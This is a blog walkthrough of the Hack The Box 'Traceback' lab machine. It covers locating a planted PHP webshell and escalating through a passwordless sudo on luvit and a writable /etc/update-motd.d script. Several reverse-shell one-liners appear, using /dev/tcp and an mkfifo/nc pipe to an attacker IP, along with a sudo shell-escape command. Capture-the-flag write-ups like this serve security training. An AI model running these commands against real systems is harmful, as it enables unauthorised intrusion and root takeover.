---
layout: post
title: Traceback Machine Walkthrough
description: >
    Traceback Hackthebox Machine Detailed Walkthrough
sitemap: false
categories: [Hackthebox]
permalink: /:categories/traceback.html
---

***"Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete."*** - Chanda Kochhar
{:.lead}
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/machine.jpeg)

## Machine Matrix
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/matrix.png)

## Machine Summary
Box is a linux machine that has a webserver running which is backdoored with a webshell. Upon getting the shell with webadmin access, privilege escalation to sysadmin can be done with misconfigured permissions of executing **luvit** i.e luvit can be executed as sysadmin without the password. On a successfull login onto the ssh, /etc/update-motd.d/ gets executed with root privilege, rewritting a file in it with reverse shell would grant us the root privilege.

## Nmap Scan
I started the enumeration with nmap scan
```bash
nmap -sC -sV 10.10.10.181
```
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/1.png)

The box had two ports open
| Port         | Service           |
|:-------------|:------------------|
| 22           | SSH               |
| 80           | Apache            |

## Enumeration on port 80
I started to enumerate on the webserver, it said "This site has been owned I have left a backdoor for all the net. FREE INTERNETZZZ -Xh4H- "

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/2.png)

Viewing the source of the page gave me a hint about the web shells, so i went on to search about Xh4H related to webshells on google

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/3.png)

## Acquiring Initial Foothold (Webadmin)
I found the web-shells repository of Xh4H, i tried putting all the web-shells in the repository on the url (http://10.10.10.181)

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/4.png)

At last, found that smevk.php is the web-shell that has been backdoored on the machine.

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/5.png)

The webshell has username and password as "admin" that i found on viewing the source of the webshell smevk.php

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/6.png)

To grant me the full fleged shell, i decided to upload a bash script that could grant me a proper shell
```bash
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
```
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/7.png)

## Acquiring User Shell (Sysadmin)
I have the shell as webadmin, now i need to enumerate and esaclate my privileges to a user. Upon enumeration, i found that no password is required to execute /home sysadmin/luvit using the command
```bash
sudo -l
```
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/8.png)

Upon googling some time, i made a command that can grant me a shell as sysadmin
```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
```
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/9.png)

I got the user, moving on to the getting the root

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/10.png)

Now i started to enumerate on the privileges of sysadmin that can be the way for root privilege escalation. Manual enumeration didnt work it out for me, so i ran linpeas but that also didnt work out. So i decided to monitor the processes that are running using pspy. I added my ssh public key in the on sysadmin/.ssh authorized_keys and transfered the pspy64 to the machine.

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/11.png)

## Acquiring Root Shell
I found that /etc/update-motd.d/ gets modified and executed each time when a user logs in through ssh

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/12.png)

I also confirmed that /etc/update-motd.d/ has files that are writable by the user sysadmin
```bash
find /etc -writable
```
I enumerated on the directory it had 4 files
```
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
```
![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/14.png)

I decided to have a bash script on /etc/update-motd.d/00-header so i added rev-shell using the command
```bash
echo "bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'" >> /etc/update-motd.d/00-header 
```
Now i logged on to ssh in a new tab with a listener on other tab hopping to get reverse connection but that didnt worked out. Upon researching i found that the modification that we made to the file isn't properly getting safed.
```bash
echo "rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2>&1|nc 10.10.14.158 9090 > /tmp/m" >> /etc/update-motd.d/00-header
```
I got the reverse shell with root privileges

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/15.png)

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/16.png)

![](https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/pwned.png)